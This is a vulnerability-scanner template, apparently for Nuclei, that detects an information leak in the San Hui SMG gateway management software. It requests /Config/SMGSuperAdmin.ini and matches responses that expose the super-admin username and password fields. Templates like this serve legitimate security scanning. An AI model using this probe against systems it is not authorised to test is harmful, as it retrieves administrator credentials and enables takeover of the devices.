id: poc-yaml-san-hui-smg-gms-smgsuperadmin-info-leak
info:
  name: 三汇SMG 网关管理软件 SMGSuperAdmin 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
http:
  - method: GET
    path:
      - "{{BaseURL}}/Config/SMGSuperAdmin.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[SuperUserInfo]"
          - "SuperUserName="
          - "SuperPwd="
          - "application/octet-stream"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
